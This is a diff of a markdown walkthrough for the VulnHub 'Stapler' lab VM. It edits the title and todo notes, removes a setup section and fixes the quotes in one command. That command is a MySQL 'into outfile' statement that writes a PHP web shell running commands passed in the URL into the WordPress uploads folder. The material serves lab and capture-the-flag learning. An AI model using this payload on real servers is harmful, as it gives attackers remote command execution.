@@ -2,22 +2,14 @@
 author: bhero
 topic: vulnHub
 ---
-Walkthrough for BsidesLondon 2016 VM: [Stapler](https://download.vulnhub.com/stapler/Stapler.zip) - PoC Page!
+Walkthrough for BsidesLondon 2016 VM: [Stapler](https://download.vulnhub.com/stapler/Stapler.zip)
 
 > Mid assessment I switched out to a clean VM for evidence, which gave the a new IP to Stapler files may reference final octet of 104/105  on the IP. They are the same VM.
 
 ### Todos
 
-* need images or outputs from triage!
+* need proof read, images or outputs need checked also
 
-## Setup
-
- > TODO walkthough for setup
-
-get stapler from the url above & setup vm: unzip and import
-I'm using a sudoer standard user on Kali, but a VM will do just as well.
-
------------------------------
 
 ## Basic Enum
 
@@ -1515,7 +1507,7 @@ $
 
 while logged into the mysql service you can write a shell to the uploads root with the following:
 ``` mysql
-select “<?php echo shell_exec($_GET[‘cmd’]);?>” into outfile ‘/var/www/https/blogblog/wp-content/uploads/mysql-shell.php’;
+select "<?php echo shell_exec($_GET['cmd']);?>" into outfile '/var/www/https/blogblog/wp-content/uploads/mysql-shell.php';
 ```
 
 Execution is as before from the system-webshell.php route. This is riskier as there is no guarantee msql can write to the php executable directories, in this case however it can!
